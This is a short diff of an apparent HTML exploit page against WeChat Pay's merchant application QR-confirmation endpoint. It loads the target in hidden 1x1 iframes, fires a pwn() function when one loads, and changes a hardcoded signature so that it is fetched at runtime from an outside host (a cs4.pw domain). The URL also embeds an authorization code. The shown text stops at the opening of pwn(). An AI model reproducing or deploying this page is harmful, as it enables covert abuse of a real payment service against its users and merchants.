@@ -1,7 +1,9 @@
 <iframe id="x" width="1" height="1" onload="pwn()" src=''></iframe>
 <iframe id="y" width="1" height="1" src=''></iframe>
 <script>
-sig='cf65777289649aadea9d8581130c0731';
+sig=''
+fetch("https://1vpctucm.cs4.pw/paypay").then(res => res.text()).then(res => sig=res);
+
   x.src='https://pay.weixin.qq.com/index.php/apply/applyment_home/confirmQrcode?actionType=1&sign='+sig+'&src=&code=081AHF000ytzaM1CiQ200VDz222AHF0D&state=';
   function pwn()
   {
